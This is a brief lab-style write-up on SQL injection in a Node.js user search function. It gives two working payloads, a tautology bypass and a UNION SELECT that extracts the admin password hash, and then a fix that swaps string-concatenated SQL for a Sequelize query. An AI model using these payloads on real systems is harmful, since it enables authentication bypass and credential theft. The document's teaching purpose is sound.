# Exploiting error based SQL injection

### Get the result of first user without knowing any user name with sqli
```
' or '1'='1
```

### Exfiltrate admin password hash
```
' UNION SELECT password,1 from Users where login='admin' -- //
```


## The fix

```
module.exports.userSearch = function (req, res) {
//Comment out the following lines 
	//var query = "SELECT name,id FROM Users WHERE login='" + req.body.login + "'";
	//db.sequelize.query(query, {
	//	model: db.User
	//}).then(user => {
	//	if (user.length) {
		db.User.find({where:{'login':req.body.login}}).then(user => {
			if (user) {
			var output = {
				user: {
					//name: user[0].name,
					//id: user[0].id
					name: user.name,
					id: user.id
				}
			}
			res.render('app/usersearch', {
				output: output
			})
		} else {
			req.flash('warning', 'User not found')
			res.render('app/usersearch', {
				output: null
			})
		}
	}).catch(err => {
		//req.flash('danger', 'Internal Error')
		req.flash('yei', 'Fixed it')
		res.render('app/usersearch', {
			output: null
		})
	})
}
```

